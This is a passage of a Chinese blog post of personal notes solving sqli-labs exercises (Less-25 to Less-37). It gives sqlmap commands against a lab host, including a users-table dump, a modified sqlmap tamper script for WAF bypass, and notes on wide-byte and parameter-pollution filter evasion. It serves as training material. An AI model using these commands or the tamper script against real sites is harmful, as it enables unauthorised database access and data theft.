+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://qsdz.vm.szu.moe:8888/Less-25/?id=1&quot;</span> -D security -T <span class="built_in">users</span> --dump --tamper doublewrite</span><br></pre></td></tr></table></figure>
+<h3 id="less-25a">Less-25a</h3>
+<p>双写后与 Less-25 一致。</p>
+<h3 id="less-26">Less-26</h3>
+<p>含有对 <code>OR</code>、<code>AND</code> 以及空格，注释符的 WAF。</p>
+<p>原理是使用其他 MySQL 可解析的空白字符来替代空格，</p>
+<table>
+<thead>
+<tr class="header">
+<th>符号</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>%09</td>
+<td>TAB 键(水平)</td>
+</tr>
+<tr class="even">
+<td>%0a</td>
+<td>新建一行</td>
+</tr>
+<tr class="odd">
+<td>%0c</td>
+<td>新的一页</td>
+</tr>
+<tr class="even">
+<td>%0d</td>
+<td>return 功能</td>
+</tr>
+<tr class="odd">
+<td>%0b</td>
+<td>TAB 键(垂直)</td>
+</tr>
+<tr class="even">
+<td>%a0</td>
+<td>空格</td>
+</tr>
+</tbody>
+</table>
+<p>但是有时针对不同系统，不同版本的管理系统，使用 sqlmap 自带的
+<code>space2mysqlblank</code>
+可能会出现错误（某些空白字符并不会解析，而该 tamper
+是随机选择的），故需要写一个稳定的版本，即</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.common <span class="keyword">import</span> singleTimeWarnMessage</span><br><span class="line"><span class="keyword">from</span> lib.core.compat <span class="keyword">import</span> xrange</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> DBMS</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    singleTimeWarnMessage(<span class="string">&quot;tamper script &#x27;%s&#x27; is only meant to be run against %s&quot;</span> % (os.path.basename(__file__).split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>], DBMS.MYSQL))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Replaces (MySQL) instances of space character (&#x27; &#x27;) with a random blank character from a valid set of alternate characters</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Requirement:</span></span><br><span class="line"><span class="string">        * MySQL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Tested against:</span></span><br><span class="line"><span class="string">        * MySQL 5.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Notes:</span></span><br><span class="line"><span class="string">        * Useful to bypass several web application firewalls</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; random.seed(0)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; tamper(&#x27;SELECT id FROM users&#x27;)</span></span><br><span class="line"><span class="string">    &#x27;SELECT%A0id%0CFROM%0Dusers&#x27;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># ASCII table:</span></span><br><span class="line">    <span class="comment">#   TAB     09      horizontal TAB</span></span><br><span class="line">    <span class="comment">#   LF      0A      new line</span></span><br><span class="line">    <span class="comment">#   FF      0C      new page</span></span><br><span class="line">    <span class="comment">#   CR      0D      carriage return</span></span><br><span class="line">    <span class="comment">#   VT      0B      vertical TAB        (MySQL and Microsoft SQL Server only)</span></span><br><span class="line">    <span class="comment">#           A0      non-breaking space</span></span><br><span class="line">    blanks = (<span class="string">&#x27;%09&#x27;</span>, <span class="string">&#x27;%0A&#x27;</span>, <span class="string">&#x27;%0C&#x27;</span>, <span class="string">&#x27;%0D&#x27;</span>, <span class="string">&#x27;%0B&#x27;</span>, <span class="string">&#x27;%A0&#x27;</span>)</span><br><span class="line">    retVal = payload</span><br><span class="line">    bVal = blanks[<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = <span class="string">&quot;&quot;</span></span><br><span class="line">        quote, doublequote, firstspace = <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="built_in">len</span>(payload)):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> firstspace:</span><br><span class="line">                <span class="keyword">if</span> payload[i].isspace():</span><br><span class="line">                    firstspace = <span class="literal">True</span></span><br><span class="line">                    retVal += bVal</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&#x27;\&#x27;&#x27;</span>:</span><br><span class="line">                quote = <span class="keyword">not</span> quote</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&#x27;&quot;&#x27;</span>:</span><br><span class="line">                doublequote = <span class="keyword">not</span> doublequote</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&quot; &quot;</span> <span class="keyword">and</span> <span class="keyword">not</span> doublequote <span class="keyword">and</span> <span class="keyword">not</span> quote:</span><br><span class="line">                retVal += bVal</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            retVal += payload[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>全文复制粘贴自
+<code>space2mysqlblank</code>，修改了部分内容，将空白字符设定为固定值，通过修改
+<code>bVal</code> 来逐步测试，命名为
+<code>space2stablemysqlblank</code>。（这是 sqlmap
+的缺点，希望之后可以返回多 payload）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://qsdz.vm.szu.moe:8888/Less-26/?id=1&quot;</span> -b --tamper space2stablemysqlblank,doublewrite</span><br></pre></td></tr></table></figure>
+<h3 id="less-26a">Less-26a</h3>
+<p>类似于 Less-26。</p>
+<h3 id="less-27">Less-27</h3>
+<p>含有对 <code>SELECT</code>、<code>UNION</code> 以及空格，注释符的
+WAF。</p>
+<p>由于 <code>SELECT</code> 和 <code>UNION</code>
+的过滤对大小写不敏感，于是可以使用自带的 <code>randomcase</code> tamper
+进行注入。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://qsdz.vm.szu.moe:8888/Less-27/?id=1&quot;</span> -b --tamper space2stablemysqlblank,randomcase</span><br></pre></td></tr></table></figure>
+<h3 id="less-27a">Less-27a</h3>
+<p>类似于 Less-27，不过要开启渗透等级大于等于 2，因为渗透等级为 1
+时不进行双引号闭合测试。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://qsdz.vm.szu.moe:8888/Less-27a/?id=1&quot;</span> -b --tamper space2stablemysqlblank,randomcase --level 2</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>由于开启了
+<code>randomcase</code>，盲注时有可能会出现一定错误，需要注意。</p>
+</blockquote>
+<h3 id="less-28">Less-28</h3>
+<p>含有对 <code>SELECT+UNION</code> 以及空格，注释符的 WAF。</p>
+<p>与 Less-27 一致。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://qsdz.vm.szu.moe:8888/Less-28/?id=1&quot;</span> -b --tamper space2stablemysqlblank,randomcase</span><br></pre></td></tr></table></figure>
+<h3 id="less-28a">Less-28a</h3>
+<p>与 Less-28 一致。</p>
+<h3 id="less-29">Less-29</h3>
+<p>无需任何参数。</p>
+<blockquote>
+<p>实际上利用方式是其 WAF 函数只过滤一个 <code>id</code>
+参数就退出，如果说构造一个 GET 参数 <code>?id=1&amp;id=2</code>，Tomcat
+JSP 会解析第一个参数，Apache PHP 会解析最后一个参数，那么两个
+<code>id</code> 参数即可绕过。</p>
+</blockquote>
+<h3 id="less-30">Less-30</h3>
+<p>闭合方式相比较 Less-29 使用了双引号，所以需要提高渗透等级为 2
+以上。</p>
+<h3 id="less-31">Less-31</h3>
+<p>与 Less-30 类似。</p>
+<h3 id="less-32">Less-32</h3>
+<p>将 <code>\</code> 转化为 <code>\\</code>，将 <code>'</code> 转化为
+<code>\'</code>，将 <code>"</code> 转化为 <code>\"</code>。</p>
+<p>原理是使用 <code>%df</code>
+将字符转化为宽字节，无法被正则表达式匹配，但可以被数据库管理系统识别。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://qsdz.vm.szu.moe:8888/Less-32/?id=1&quot;</span> --dbs --tamper unmagicquotes</span><br></pre></td></tr></table></figure>
+<h3 id="less-33">Less-33</h3>
+<p>利用 <code>addslashes</code> 功能实现 Less-32
+的过滤方法，解决方法同理。</p>
+<h3 id="less-34">Less-34</h3>
+<p>与 Less-33 的过滤方法一致，不过此时是 POST 传参，解决方法同理。</p>
+<h3 id="less-35">Less-35</h3>
+<p>与 Less-33 的过滤方法一致，不过此时是整型传参，解决方法同理。</p>
+<h3 id="less-36">Less-36</h3>
+<p>使用 <code>mysql_real_escape_string</code> 进行转义，主要针对
+<code>\x00</code>，<code>\n</code>，<code>\r</code>，<code>'</code>，<code>"</code>
+和 <code>\x1a</code>，解决方法同理。</p>
+<h3 id="less-37">Less-37</h3>
+<p>与 Less-36 的过滤方法一致，不过此时是 POST 传参，解决方法同理。</p>
+<h1 id="数据库软件特点">数据库软件特点</h1>
+<h2 id="mysql">MySQL</h2>
+<p>在 MySQL 中，会默认存在两个库 <code>mysql</code> 和
+<code>information_schema</code>。</p>
+<p>其中 <code>information_schema</code> 这个库保存着 MySQL
+的所有信息，重要的是，<code>information_schema</code>
+包含以下几个重要的表：</p>
+<ul>
+<li><code>SCHEMATA</code> → 包含所有
+<code>SCHEMA_NAME</code>，即所有的库名，包括本身</li>
+<li><code>TABLES</code> → 包含所有
+<code>TABLE_NAME</code>，即所有的表名，包括本身</li>
+<li><code>COLUMNS</code> → 包含所有的
+<code>COLUMN_NAME</code>，即所有的字段名，包括本身</li>
+</ul>
+<p><code>COLUMNS</code> 表里有着几个重要的字段名：</p>
+<ul>
+<li><code>TABLE_SCHEMA</code> → 库名</li>
+<li><code>TABLE_NAME</code> → 表名</li>
+<li><code>COLUMN</code> → 字段名</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>qsdz
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://hasegawaazusa.github.io/sql-inject-note.html" title="sql注入笔记">https://hasegawaazusa.github.io/sql-inject-note.html</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/note/" rel="tag"><i class="fa fa-tag"></i> note</a>
+              <a href="/tags/web/" rel="tag"><i class="fa fa-tag"></i> web</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/ciphey-note.html" rel="prev" title="ciphey 笔记">
+                  <i class="fa fa-chevron-left"></i> ciphey 笔记
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/std-string-note.html" rel="next" title="std::string笔记">
+                  std::string笔记 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2022 – 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder"></span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">813k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">12:19</span>
+  </span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">false</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"all","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+
+</body>
+</html>
